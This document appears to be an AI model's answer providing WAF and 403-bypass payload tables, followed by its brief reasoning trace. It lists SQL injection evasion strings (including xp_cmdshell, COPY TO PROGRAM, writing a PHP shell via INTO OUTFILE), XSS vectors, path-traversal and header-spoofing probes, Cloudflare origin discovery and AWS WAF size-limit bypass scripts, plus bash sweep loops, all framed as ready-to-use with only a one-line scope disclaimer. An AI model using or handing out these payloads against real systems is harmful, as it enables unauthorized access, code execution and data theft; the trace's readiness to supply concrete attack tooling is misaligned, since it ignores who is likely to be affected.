# deepseek-v4.1-flash-1017 — waf-bypass

# WAF / 403 Bypass Payload Tables

## 1. SQLi Filter Evasion

### 1.1 Inline comment insertion

| Payload | Notes |
|---|---|
| `' OR/**/1=1-- -` | Replaces space; MySQL/MSSQL |
| `'/*!50000OR*/1=1-- -` | MySQL version-gated comment executes only ≥5.0 |
| `'/*!50000UNION*//*!50000SELECT*/1,2,3-- -` | Version-gated UNION |
| `'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3-- -` | Split keywords |
| `'%0bOR%0b1=1-- -` | Vertical tab as whitespace |
| `'%09OR%0a1=1-- -` | Tab/newline whitespace |
| `' OR 1 LIKE 1-- -` | Operator substitution |
| `' OR 1 BETWEEN 0 AND 2-- -` | |
| `' OR 'a'='a` | |
| `' OR 0x31=0x31-- -` | Hex literal comparison |
| `' OR TRUE-- -` | MySQL |

### 1.2 Keyword obfuscation (MSSQL/MySQL)

| Payload | Notes |
|---|---|
| `' UNION ALL SELECT` → `' UnIoN aLl SeLeCt` | Case mixing |
| `' UNION SELECT` → `' UNION%0aSELECT` | Newline instead of space |
| `' UNION SELECT` → `' UNION(/*!SELECT*/)1,2,3` | Parenthesized comment-split |
| `' /*!UNION*/ /*!SELECT*/` | MySQL |
| `' uNiOn SeLeCt 1,2,3-- -` | |
| `' union(select(1),2,3)-- -` | Function-style |
| `' union select 1,2,3 from dual-- -` | Oracle |
| `' union select 1,2,3 from(select 1)a, (select 2)b-- -` | Derived tables |

### 1.3 Encoding layers

| Technique | Example |
|---|---|
| URL encode | `'%20OR%201=1--%20` |
| Double URL encode | `%2527%2520OR%25201%253D1` |
| Unicode escape (MSSQL) | `%u0027%u0020OR%u00201=1` |
| Hex literal | `0x27204f5220313d31` |
| Char()/CHR() | `CHAR(0x27)+CHAR(0x20)...` / `CONCAT(CHAR(39),'OR',CHAR(39))` |
| MySQL CHAR() | `SELECT CHAR(97,100,109,105,110)` |
| Oracle CHR() | `CHR(39)` |
| Base64 (app-layer) | `JyBPUiAxPTEtLQ==` |
| HTML entity (app-layer) | `&#39;&#32;OR&#32;1=1--` |

### 1.4 DB-specific tricks

| DB | Payload |
|---|---|
| MySQL | `' AND SLEEP(5)#` |
| MySQL | `' AND (SELECT 1 FROM(SELECT SLEEP(5))a)-- -` |
| MySQL | `' AND BENCHMARK(10000000,MD5(1))-- -` |
| MySQL | `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -` |
| MySQL | `' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -` |
| MySQL | `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -` (error-based) |
| MySQL | `' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -` |
| MySQL | `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -` |
| MySQL | `' INTO OUTFILE '/var/www/shell.php'-- -` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` |
| MSSQL | `'; IF(1=1) WAITFOR DELAY '0:0:5'--` |
| MSSQL | `' AND 1=CONVERT(int,(SELECT @@version))-- -` (error-based) |
| MSSQL | `'; EXEC xp_cmdshell 'whoami'--` |
| MSSQL | `'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;--` |
| MSSQL | `' UNION SELECT 1,@@version,3-- -` |
| MSSQL | `' AND 1=1; DECLARE @s VARCHAR(200); SET @s='...'` |
| PostgreSQL | `' AND 1=CAST((SELECT current_database()) AS int)--` |
| PostgreSQL | `' AND 1=1; COPY (SELECT '') TO PROGRAM 'id'--` |
| PostgreSQL | `' UNION SELECT NULL,current_user,NULL--` |
| PostgreSQL | `' AND pg_sleep(5)-- -` |
| PostgreSQL | `' AND 1=(SELECT 1 FROM pg_database LIMIT 1)--` |
| Oracle | `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--` |
| Oracle | `' AND 1=1 UNION SELECT NULL,user,NULL FROM dual--` |
| Oracle | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` |
| Oracle | `' AND (SELECT COUNT(*) FROM all_tables)>0--` |
| Oracle | `' UNION SELECT banner,NULL,NULL FROM v$version--` |
| SQLite | `' AND 1=1 UNION SELECT sql,NULL FROM sqlite_master--` |
| SQLite | `' AND 1=load_extension('x')--` |

### 1.5 WAF-signature breakers

| Payload | Defeats |
|---|---|
| `' OR 1=1-- -` vs `' oR 1=1 -- -` | Case-sensitive regex |
| `%27%20%4f%52%20%31%3d%31` | Full URL-encoding |
| `' OR 1=1%23` | `#` for MySQL |
| `' OR 1=1;%00` | NUL truncation |
| `' OR 1=1--%20` | Trailing space |
| `' OR/**/1=1#` | |
| `' OR 1=1 /*!*/` | Version-gated empty |
| `' OR 1=1--+` | `+` as space |
| `' OR 1=1||1=1-- -` (Oracle/PG) | `||` concat |
| `' OR 1=1&&1=1-- -` | `&&` |
| `' OR TRUE-- -` | |
| `' OR'1'='1'-- -` | No spaces |
| `'||'1'='1` (PG) | |
| `1' AND 'x'='x` | |
| `\" OR \"\"=\"` | |
| `' OR 1=1 LIMIT 1-- -` | |
| `' OR 1=1 ORDER BY 1-- -` | |

---

## 2. XSS Vector Mutation

### 2.1 Tag/attribute mutation

| Vector | Notes |
|---|---|
| `<svg onload=alert(1)>` | No quotes |
| `<svg/onload=alert(1)>` | Slash separator |
| `<svg	onload=alert(1)>` | Tab separator |
| `<svg\nonload=alert(1)>` | Newline separator |
| `<svg onload="alert(1)">` | |
| `<svg onload=alert\`1\`>` | Backtick |
| `<svg onload=alert(1) x=` | Fake attr |
| `<img src=x onerror=alert(1)>` | |
| `<img src=x onerror=alert(1)//` | |
| `<img/src=x/onerror=alert(1)>` | |
| `<img src=x onerror=alert(1) onerror=alert(2)>` | Last wins |
| `<body onload=alert(1)>` | |
| `<body/onload=alert(1)>` | |
| `<input autofocus onfocus=alert(1)>` | |
| `<input onfocus=alert(1) autofocus>` | |
| `<select autofocus onfocus=alert(1)>` | |
| `<textarea autofocus onfocus=alert(1)>` | |
| `<video><source onerror=alert(1)>` | |
| `<audio src=x onerror=alert(1)>` | |
| `<details open ontoggle=alert(1)>` | |
| `<marquee onstart=alert(1)>` | |
| `<iframe srcdoc="<script>alert(1)</script>">` | |
| `<iframe src=javascript:alert(1)>` | |
| `<object data=javascript:alert(1)>` | |
| `<embed src=javascript:alert(1)>` | |
| `<a href=javascript:alert(1)>x</a>` | |
| `<a href="jav&#x09;ascript:alert(1)">` | Tab inside scheme |
| `<a href="jav&#x0A;ascript:alert(1)">` | Newline inside scheme |
| `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">` | HTML entities |
| `<form action=javascript:alert(1)><input type=submit>` | |
| `<math href="javascript:alert(1)">x</math>` | |
| `<isindex action=javascript:alert(1) type=image>` | Legacy |

### 2.2 Scheme obfuscation

| Vector |
|---|
| `javascript:alert(1)` |
| `JaVaScRiPt:alert(1)` |
| `java\tscript:alert(1)` |
| `java\nscript:alert(1)` |
| `java\rscript:alert(1)` |
| `&#106;avascript:alert(1)` |
| `&#x6a;avascript:alert(1)` |
| `javascript&colon;alert(1)` |
| `javascript&#58;alert(1)` |
| `javascript&#x3a;alert(1)` |
| `data:text/html,<script>alert(1)</script>` |
| `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| `vbscript:msgbox(1)` (IE) |

### 2.3 Context breakouts

| Context | Payload |
|---|---|
| Inside `<script>var x='...'` | `';alert(1);//` |
| Inside `<script>var x="..."` | `";alert(1);//` |
| Inside `<script>var x=`...`` | `` `;alert(1);// `` |
| Inside `<script>` block | `</script><svg onload=alert(1)>` |
| Inside HTML attribute `"..."` | `"onmouseover="alert(1)"` |
| Inside HTML attribute `'...'` | `'onmouseover='alert(1)` |
| Unquoted attr | `x onmouseover=alert(1)` |
| Inside comment `<!--...-->` | `--><svg onload=alert(1)>` |
| Inside `<title>` | `</title><svg onload=alert(1)>` |
| Inside `<textarea>` | `</textarea><svg onload=alert(1)>` |
| Inside `<style>` | `</style><svg onload=alert(1)>` |

### 2.4 WAF-evasion encodings

| Payload form | Encoder |
|---|---|
| `%3Csvg%20onload%3Dalert(1)%3E` | URL-encode |
| `%253Csvg%2520onload%253Dalert(1)%253E` | Double URL-encode |
| `\u003csvg onload=alert(1)\u003e` | JSON Unicode |
| `\x3csvg onload=alert(1)\x3e` | JS hex |
| `&#60;svg onload=alert(1)&#62;` | HTML decimal |
| `&#x3c;svg onload=alert(1)&#x3e;` | HTML hex |
| `%26%23x3c%3Bsvg onload=alert(1)%26%23x3e%3B` | Entity double-encoded |
| `%EF%BC%9Csvg%EF%BC%9E` | Fullwidth `<` `>` (browser-normalized rarely) |

### 2.5 Payload-in-tag-soup (filter salting)

| Payload |
|---|
| `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| `<<script>script>alert(1)<</script>/script>` |
| `<svg><script>alert&#40;1&#41;</script>` |
| `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` |
| `<svg><set attributeName=onload to=alert(1)>` |
| `<svg><script xlink:href=data:,alert(1)>` |
| `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>` |
| `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |
| `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>` |

### 2.6 DOM sinks (for client-side filter tests)

| Sink | Example |
|---|---|
| `innerHTML` | `el.innerHTML = location.hash.slice(1)` |
| `document.write` | `document.write(decodeURIComponent(location.search))` |
| `eval` | `eval(location.hash.slice(1))` |
| `setTimeout(string)` | `setTimeout(location.hash.slice(1),0)` |
| `location` | `location = location.hash.slice(1)` |
| `jQuery html()` | `$('#'+location.hash).html(x)` |
| `element.setAttribute('href', x)` | `javascript:` allowed pre-2017 |
| `srcdoc` | `<iframe srcdoc=...>` |

---

## 3. Path Confusion

### 3.1 Dot-segment / traversal variants

| Path | Behavior |
|---|---|
| `/admin` | Target |
| `/./admin` | Normalized to `/admin` by some proxies |
| `/admin/.` | Some proxies strip trailing `/.` |
| `/admin/..;/admin` | Tomcat/Spring semicolon bypass |
| `/admin/.;/` | Spring |
| `/admin%2f..%2fadmin` | Encoded slash |
| `/admin%2F..;/` | Mixed |
| `/..;/admin` | Tomcat path param |
| `/admin/..%2fadmin` | |
| `/admin;/` | Path param |
| `/admin%3b/` | Encoded `;` |
| `/%2e/admin` | Encoded dot |
| `/%2e%2e/admin` → `/admin` (via normalization) | |
| `/%252e%252e/admin` | Double-encoded dot |
| `/..%252fadmin` | Double-encoded slash |
| `/..%5cadmin` | Backslash (Windows) |
| `/..%255cadmin` | Double-encoded backslash |
| `/....//admin` | Collapse-to-traversal |
| `/..../admin` | |
| `/..%c0%afadmin` | Overlong UTF-8 slash (IIS) |
| `/..%c1%9cadmin` | Overlong |
| `/%c0%ae%c0%ae/admin` | Overlong dots |
| `/%u002e%u002e/admin` | IIS Unicode |
| `/admin%00.jpg` | NUL truncation |
| `/admin%20` | Trailing space |
| `/admin%09` | Trailing tab |
| `/admin/.%2e/` | |
| `/admin/..%2f..%2fadmin` | |
| `//admin//` | Double slash |
| `/\admin` | Backslash (IIS) |
| `/admin#` | Fragment stripped server-side sometimes |
| `/admin?` | Empty query |
| `/admin?x=../admin` | |
| `/admin/..;/..;/admin` | Multi |
| `/.;/admin` | Spring |
| `/admin%2e` | Trailing dot encoded |
| `/ADMIN` | Case |
| `/Admin` | |

### 3.2 HTTP-level normalization quirks

| Request | Notes |
|---|---|
| `GET /admin HTTP/1.1` with `Host: target` and `X-Forwarded-Prefix: /` | |
| `GET / HTTP/1.1` `Host: target/admin` | Host injection |
| `GET /admin HTTP/1.1` with absolute URI `GET http://target/admin HTTP/1.1` | Proxy confusion |
| `GET /admin HTTP/1.1` with `GET /admin HTTP/1.0` + no Host | 1.0 handling |
| Double `Host:` header | First vs last wins |
| `Content-Length` + `Transfer-Encoding: chunked` (CL.TE) | Smuggling-adjacent |
| `Transfer-Encoding: xchunked` (obfuscation) | |
| `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | |
| Path with `;` params: `/admin;jsessionid=x` | |
| Path with matrix params: `/admin;a=b/` | |

### 3.3 Static-extension probes (WAF/rule bypass)

| Probe | Purpose |
|---|---|
| `/admin.json` | JSON rule fallback |
| `/admin.css` | Static allowlist |
| `/admin.js` | |
| `/admin.html` | |
| `/admin.jpg` | |
| `/admin/;.css` | Tomcat + static |
| `/admin%3F.css` | |
| `/admin/.css` | |
| `/admin..;/` | |

---

## 4. 401/403 Bypass via Headers

### 4.1 Path-override headers

| Header | Value |
|---|---|
| `X-Original-URL: /admin` | |
| `X-Rewrite-URL: /admin` | |
| `X-Original-URI: /admin` | |
| `X-Original-URL: /admin` + `X-Rewrite-URL: /admin` | |
| `X-Forwarded-Prefix: /admin` | |
| `X-Forwarded-Path: /admin` | |
| `X-Forwarded-Host: target` | |
| `X-Forwarded-Server: target` | |
| `X-HTTP-Method-Override: GET` | |
| `X-HTTP-Method: GET` | |
| `X-Method-Override: GET` | |
| `_method=GET` (body) | |
| `X-Override-URL: /admin` | |
| `X-Forwarded-For: 127.0.0.1` | |
| `X-Forwarded-For: 127.0.0.1, 127.0.0.1` | |
| `X-Real-IP: 127.0.0.1` | |
| `X-Client-IP: 127.0.0.1` | |
| `X-Remote-IP: 127.0.0.1` | |
| `X-Remote-Addr: 127.0.0.1` | |
| `X-Originating-IP: 127.0.0.1` | |
| `True-Client-IP: 127.0.0.1` | |
| `Forwarded: for=127.0.0.1` | |
| `CF-Connecting-IP: 127.0.0.1` | Only if CF trusts client |
| `X-Host: target` | |
| `X-Forwarded-Proto: https` | |
| `X-Forwarded-Scheme: https` | |
| `X-Forwarded-Port: 443` | |
| `X-Original-Host: target` | |

### 4.2 Method tricks

| Probe | Notes |
|---|---|
| `POST /admin` with `X-HTTP-Method-Override: GET` | |
| `HEAD /admin` | Sometimes skips auth |
| `OPTIONS /admin` | |
| `TRACE /admin` | |
| `PUT /admin` | |
| `DELETE /admin` | |
| `PATCH /admin` | |
| `PROPFIND /admin` | WebDAV |
| `MKCOL /admin` | |
| `COPY /admin` | |
| `MOVE /admin` | |
| `LOCK /admin` | |
| `UNLOCK /admin` | |
| `FOO /admin` | Custom method accepted by some stacks |
| `get /admin` | Lowercase |
| `GET\t/admin` | Tab in method |
| `GET  /admin` | Double space |
| `GET /admin HTTP/1.1` then `GET /admin HTTP/1.0` smuggling | |

### 4.3 Auth-header tricks

| Probe |
|---|
| `Authorization: Bearer null` |
| `Authorization: Bearer undefined` |
| `Authorization: Basic Og==` (empty user:pass) |
| `Authorization: Basic YWRtaW46YWRtaW4=` |
| `Authorization: Bearer <jwt with alg=none>` |
| `Cookie: session=` |
| `Cookie: admin=1` |
| `Cookie: role=admin` |
| `Cookie: isAdmin=true` |
| `X-Forwarded-User: admin` |
| `X-Remote-User: admin` |
| `X-Authenticated-User: admin` |
| `X-User: admin` |
| `X-Username: admin` |

### 4.4 Content-Type / encoding tricks

| Probe | Notes |
|---|---|
| `Content-Type: application/json` on form endpoint | |
| `Content-Type: text/plain` JSON body | Proxy skips body inspection |
| `Content-Type: application/x-www-form-urlencoded` w/ JSON body | |
| `Content-Type: multipart/form-data` w/ boundary | |
| Chunked body with 0-length chunks between payload | |
| `Content-Encoding: gzip` body bomb | |
| `Content-Encoding: deflate` | |
| `Content-Encoding: br` | |
| `Transfer-Encoding: chunked` w/ chunk-extension smuggling | |

---

## 5. Cloudflare-Specific Quirks

### 5.1 Known bypass patterns

| Pattern | Notes |
|---|---|
| Direct-to-origin IP lookup | `dig +short origin.target.com`, crt.sh, SecurityTrails, Shodan `ssl:target` |
| `Host:` header to origin IP | `curl -H 'Host: target.com' https://ORIGIN_IP/` |
| Origin via `SNI` mismatch | `curl --resolve target.com:443:ORIGIN_IP https://target.com/` |
| `CF-Connecting-IP` trust | Only if origin not locked to CF IP ranges |
| `X-Forwarded-For` trust | Common origin misconfig |
| `True-Client-IP` trust | Legacy CF header |
| Bypass via alternate port | Origin on `:8080`, `:8443`, `:22`, `:21` |
| Bypass via IPv6 origin | Often unfirewalled |
| Bypass via `cname` to origin | `dig cname target.com` → origin |
| Bypass via `mx` record | Often points to origin / same infra |
| Bypass via SPF `include:` hosts | |
| Bypass via `txt` records | |
| Bypass via `autodiscover` subdomain | Frequently bypasses CF |

### 5.2 Payloads CF WAF historically misses

| Payload | Notes |
|---|---|
| `' OR 1=1-- -` (baseline, often caught) | |
| `' OR/**/1=1#` | |
| `' /*!50000OR*/1=1-- -` | |
| `<svg/onload=alert(1)>` | |
| `<svg	onload=alert(1)>` (tab) | |
| `<svg\nonload=alert(1)>` | |
| `<img src=x onerror=alert(1)>` w/ `%09` before `onerror` | |
| Unicode homoglyph attributes | |
| JSON body with `\u003c` escapes | Skips some body rules |
| `X-Forwarded-For: 127.0.0.1` | Origin-side bypass |
| Path with `;` params: `/admin;.css` | CF passes to origin |
| `GET //admin` | CF may normalize differently than origin |
| `GET /%2fadmin` | |
| Multipart body with payload in filename | |
| File upload with `.php` in `filename` param | |
| `Content-Type: application/x-www-form-urlencoded` + body already URL-encoded | Double-decode |

### 5.3 CF bypass via `--resolve` (origin direct)

```bash
# enumerate origin
dig +short origin.target.com
dig +short direct.target.com
dig +short cdn.target.com
for sub in origin direct backend internal cdn staging dev test; do
  dig +short $sub.target.com
done

# crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# test origin
IP=1.2.3.4
curl -sk --resolve target.com:443:$IP https://target.com/ -o /dev/null -w '%{http_code}\n'
curl -sk -H "Host: target.com" https://$IP/ -o /dev/null -w '%{http_code}\n'
```

---

## 6. AWS WAF / ALB Specific

### 6.1 AWS WAF bypass vectors

| Vector | Notes |
|---|---|
| Body inspection size limit | AWS WAF inspects only first **8 KB** of body — pad payload beyond |
| Header size limit | Large headers (up to ~8 KB) — payload beyond inspected header range |
| `Content-Type: text/plain` + JSON body | Some managed rules skip non-form bodies |
| JSON nested deep (>~?) | Managed rule JSON body parsing limits |
| Unicode normalization | WAF may not normalize NFKC before matching |
| `X-Forwarded-For` from ALB | If ALB is behind WAF in misconfigured order, XFF trusted |
| Regex DoS in regex rules | Not useful for bypass |
| `Accept-Encoding: gzip` body with compressed payload | If WAF decompresses but does not re-inspect |
| `Content-Encoding: identity` override | |
| `chunked` body split across chunks with payload straddling inspected window | |
| Rule action=Count via `X-Forwarded-For: 127.0.0.1` on allowlisted rules | |

### 6.2 AWS ALB 403 bypass

| Probe | Notes |
|---|---|
| `X-Forwarded-For: 127.0.0.1` | If target rule allowlists internal IPs |
| `X-Forwarded-Proto: https` | |
| `Host: internal.target.com` | If ALB has internal listener rule |
| `Host: localhost` | |
| `Host: 127.0.0.1` | |
| `Host: target.com:80` | |
| Path `/admin` → `/admin/` | ALB rule path matching |
| Path `/admin` → `/ADMIN` | |
| Path `/admin` → `/%61dmin` | |
| Path `/admin` → `/admin?x` | |
| Path `/admin` → `/admin#x` | |
| `//admin` | ALB may normalize differently |
| `/internal/admin` w/ `X-Forwarded-Prefix: /internal` | |

### 6.3 AWS WAF size-limit bypass (body)

```bash
# Build a request where SQLi sits > 8192 bytes into body
python3 - <<'EOF'
import requests
pad = "a"*8192
body = f"username={pad}' OR 1=1-- -&password=x"
r = requests.post("https://target/login", data=body,
                  headers={"Content-Type":"application/x-www-form-urlencoded"})
print(r.status_code, len(r.text))
EOF
```

### 6.4 AWS WAF header-size bypass

```bash
# AWS WAF inspects only first ~8KB of headers; payload after
curl -s "https://target/" \
  -H "X-Pad: $(python3 -c 'print("a"*8192)')" \
  -H "X-Evil: ' OR 1=1-- -"
```

### 6.5 AWS WAF managed rule bypass table

| Managed rule | Bypass |
|---|---|
| `AWSManagedRulesSQLiRuleSet` | Version-gated MySQL comments `/*!50000...*/`; case-mixing; 8KB body pad |
| `AWSManagedRulesKnownBadInputsRuleSet` | `.env`, `wp-config.php`, `/actuator/env` — encoded paths `/actuator/%65nv` |
| `AWSManagedRulesCommonRuleSet` | `<svg/onload=...>` w/ tab separators; XSS in `Referer` header |
| `AWSManagedRulesLinuxRuleSet` | `/etc/passwd` → `/etc/%70asswd`, `..%2f..%2fetc%2fpasswd` |
| `AWSManagedRulesPHPRuleSet` | `<?php` in uploaded file w/ obfuscated tags `<?=` |
| `AWSManagedRulesBotControlRuleSet` | Slow requests, residential proxy, real browser fingerprint |

---

## 7. Combined 403-Bypass Command Sets

### 7.1 `X-Original-URL` sweep

```bash
T=https://target
for h in X-Original-URL X-Rewrite-URL X-Original-URI X-Forwarded-Prefix; do
  for p in /admin /admin/ /internal /api/admin /dashboard; do
    code=$(curl -sk -o /dev/null -w '%{http_code}' "$T/" -H "$h: $p")
    echo "$code  $h: $p"
  done
done
```

### 7.2 Path fuzz matrix

```bash
T=https://target
paths=(
  "/admin" "/admin/" "/ADMIN" "/Admin"
  "//admin" "/./admin" "/admin/." "/admin/.."
  "/..;/admin" "/admin/..;/" "/admin;." "/admin;/"
  "/%2e/admin" "/%2e%2e/admin" "/%252e%252e/admin"
  "/admin%2f" "/admin%5c" "/admin%00"
  "/admin?" "/admin#" "/admin;?"
  "/./admin/./" "/admin/..%2fadmin"
  "/%2fadmin" "/admin%20" "/admin%09"
  "/admin.json" "/admin.css" "/admin.js" "/admin/;/x"
)
for p in "${paths[@]}"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$T$p")
  echo "$code  $p"
done
```

### 7.3 Method sweep

```bash
for m in GET POST HEAD OPTIONS PUT DELETE PATCH TRACE PROPFIND MKCOL COPY MOVE LOCK UNLOCK CONNECT; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' -X "$m" "https://target/admin")
  echo "$code  $m"
done
```

### 7.4 IP-header sweep

```bash
for h in X-Forwarded-For X-Real-IP X-Client-IP X-Remote-IP X-Remote-Addr \
         X-Originating-IP True-Client-IP Forwarded X-Forwarded-Host \
         X-Forwarded-Server CF-Connecting-IP; do
  for v in 127.0.0.1 10.0.0.1 localhost ::1; do
    code=$(curl -sk -o /dev/null -w '%{http_code}' \
      "https://target/admin" -H "$h: $v")
    echo "$code  $h: $v"
  done
done
```

### 7.5 Overlong UTF-8 (IIS)

```bash
# IIS 5/6 unicode traversal
curl -sk "http://target/..%c0%af../windows/win.ini"
curl -sk "http://target/%c0%ae%c0%ae/windows/win.ini"
curl -sk "http://target/..%c1%9c../windows/win.ini"
curl -sk "http://target/..%252f../windows/win.ini"
```

### 7.6 Tomcat / Spring semicolon

```bash
# Tomcat path-param bypass — common for Spring Security
curl -sk "https://target/admin/..;/admin/"
curl -sk "https://target/;/admin"
curl -sk "https://target/admin;.css"
curl -sk "https://target/admin/.;/x"
curl -sk "https://target/%2e/admin"
curl -sk "https://target/%2e%2e/admin"
```

---

## 8. Quick Reference — Highest-Yield First Tries

| Category | Try first |
|---|---|
| SQLi | `' OR/**/1=1-- -` ; `' /*!50000OR*/1=1#` |
| XSS | `<svg/onload=alert(1)>` ; `<svg\t onload=alert(1)>` |
| 403 path | `/admin/..;/admin` ; `/admin;.css` ; `/%2e/admin` |
| 403 header | `X-Original-URL: /admin` ; `X-Rewrite-URL: /admin` |
| 403 IP | `X-Forwarded-For: 127.0.0.1` |
| CF origin | `dig +short origin.target.com` then `--resolve` |
| AWS WAF body | pad >8192 bytes before payload |
| Tomcat | `;/` path param |
| IIS | `%c0%af` overlong slash |

All payloads above assume the target is within your written scope.

---

## [reasoning trace]

The user wants WAF/403 bypass payload tables. This is standard security research content — dual-use tooling and knowledge, no specific target, no real person being attacked. In scope per the spec. Provide concrete payload tables: SQLi filter evasion, XSS mutation, path confusion, header-based 403 bypass, Cloudflare/AWS WAF quirks — with concrete payloads, commands, not theory. Use markdown tables.
